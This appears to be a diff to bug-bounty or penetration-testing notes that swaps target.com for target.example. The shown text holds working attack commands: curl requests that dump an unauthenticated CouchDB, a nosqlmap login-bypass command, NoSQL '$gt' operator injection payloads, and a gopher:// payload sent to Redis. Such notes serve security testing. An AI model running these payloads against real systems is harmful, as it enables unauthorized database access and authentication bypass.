@@ -57,14 +57,14 @@ Content-Type: application/json
 
 ## Pattern 4: CouchDB Admin API Exposed (Critical, $8,000)
 
-**Endpoint:** `http://target.com:5984/_all_dbs`
+**Endpoint:** `http://target.example:5984/_all_dbs`
 **Auth:** None required
 
 **Attack sequence:**
 ```bash
-curl http://target.com:5984/_all_dbs
-curl http://target.com:5984/users/_all_docs
-curl http://target.com:5984/users/DOCUMENT_ID
+curl http://target.example:5984/_all_dbs
+curl http://target.example:5984/users/_all_docs
+curl http://target.example:5984/users/DOCUMENT_ID
 ```
 
 **Impact:** Full database dump without authentication.
@@ -113,14 +113,14 @@ gopher://127.0.0.1:6379/_BGSAVE%0d%0a
 
 ```bash
 # nosqlmap auth bypass
-nosqlmap -u "https://target.com/api/login" --attack 1 --httpMethod POST \
+nosqlmap -u "https://target.example/api/login" --attack 1 --httpMethod POST \
   --postData '{"username":"INJECT","password":"test"}'
 
 # Manual test
-curl -s -X POST https://target.com/api/login \
+curl -s -X POST https://target.example/api/login \
   -H "Content-Type: application/json" \
   -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
 
 # URL parameter test
-curl "https://target.com/api/users?username[$gt]=&password[$gt]="
+curl "https://target.example/api/users?username[$gt]=&password[$gt]="
 ```
